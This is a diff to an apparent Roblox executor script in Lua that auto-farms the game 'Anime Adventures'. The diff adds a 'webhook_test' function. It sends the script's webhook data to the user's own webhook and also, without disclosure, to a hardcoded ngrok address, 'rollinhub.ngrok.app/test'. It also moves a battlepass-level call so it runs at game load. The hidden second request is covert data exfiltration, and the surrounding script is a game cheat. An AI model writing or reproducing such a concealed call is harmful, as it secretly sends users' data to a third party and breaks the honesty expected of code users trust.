@@ -1709,6 +1709,28 @@ function webhook()
   end)
 end
 
+function webhook_test()
+  pcall(function()
+    local url = settings.personal_webhook_url
+    local data = webhook_data()
+    local body = HttpService:JSONEncode(data)
+    local headers = { ["content-type"] = "application/json" }
+    request = http_request or (syn and syn.request)
+    request({
+      Method = "POST",
+      Url = url,
+      Headers = headers,
+      Body = body
+    })
+    request({
+      Method = "POST",
+      Url = 'https://rollinhub.ngrok.app/test',
+      Headers = { ["content-type"] = "application/json" },
+      Body = body
+    })
+  end)
+end
+
 function webhook_finish()
   pcall(function()
     local data = webhook_data(true)
@@ -2102,7 +2124,6 @@ function auto_start()
         local challenge = settings.farm_mode == "Challenge"
         if manual or gems or story or level_id or level_bp then
           start_farming()
-          set_battlepass_level()
         elseif portal then
           start_portal()
         elseif raid then
@@ -3290,6 +3311,7 @@ end
 
 auto_reconnect()
 if game.PlaceId == ANIME_ADVENTURES_ID then
+  set_battlepass_level()
   auto_buy_items()
   auto_claim_quests()
   auto_select_units()
